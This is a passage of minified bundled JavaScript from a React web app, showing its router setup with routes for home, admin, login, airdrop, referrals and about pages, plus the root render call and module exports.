Q.jsx(o2,{children:Q.jsx(RP,{children:Q.jsx(IV,{children:Q.jsxs(SP,{children:[Q.jsx(Uo,{path:"/",element:Q.jsx(O9,{})}),Q.jsx(Uo,{path:"/admin",element:Q.jsx(B9,{})}),Q.jsx(Uo,{path:"/login",element:Q.jsx(U9,{})}),Q.jsx(Uo,{path:"/airdrop",element:Q.jsx(z9,{})}),Q.jsx(Uo,{path:"/referrals",element:Q.jsx(W9,{})}),Q.jsx(Uo,{path:"/about",element:Q.jsx($9,{})})]})})})})}jm.createRoot(document.getElementById("root")).render(Q.jsx(ae.StrictMode,{children:Q.jsx(o2,{children:Q.jsx(H9,{})})}));export{Se as P,Zi as S,mr as T,Wu as V,In as a,qa as b,Eo as g};
